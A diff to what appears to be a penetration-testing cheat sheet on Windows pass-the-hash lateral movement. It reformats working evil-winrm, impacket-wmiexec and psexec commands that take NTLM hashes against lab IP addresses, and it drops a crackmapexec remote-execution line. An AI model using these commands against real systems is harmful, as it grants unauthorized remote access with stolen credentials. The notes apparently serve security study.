@@ -139,15 +139,12 @@ psexec.py "frank castle":@192.168.57.141 -hashes aad3b435b51404eeaad3b435b51404e
 ```
 
 - Remote Access + evil-winrm  
-```
-evil-winrm -i <IP> -u <user> -H <hash>
-```
 
-#using crackmapexec on kali to access x.105 and host in 192.168.57.0/24
-crackmapexec smb 192.168.1.105 -u Administrator -H 32196B56FFE6F45E294117B91A83BF38 -x ipconfig
+         evil-winrm -i <IP> -u <user> -H <hash>
 
-#using wmiexec on kali
-kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
+
+- using wmiexec on kali
+         kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
 
 
 ## Over Pass the Hash
